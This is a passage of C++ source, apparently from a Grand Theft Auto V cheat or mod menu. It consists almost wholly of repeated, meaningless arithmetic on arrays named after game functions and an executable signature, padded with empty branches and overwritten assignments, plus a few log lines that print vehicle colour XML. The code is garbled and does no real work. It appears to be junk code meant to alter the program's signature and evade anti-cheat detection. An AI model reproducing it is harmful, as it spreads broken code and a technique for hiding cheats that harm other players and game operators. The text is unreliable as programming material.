			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<Colours>");
			Extern_Reader::LOG::LogSemHora("<Primary>12</Primary>");
			Extern_Reader::LOG::LogSemHora("<Secondary>12</Secondary>");
			Extern_Reader::LOG::LogSemHora("<Pearl>0</Pearl>");
			Extern_Reader::LOG::LogSemHora("<Rim>156</Rim>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
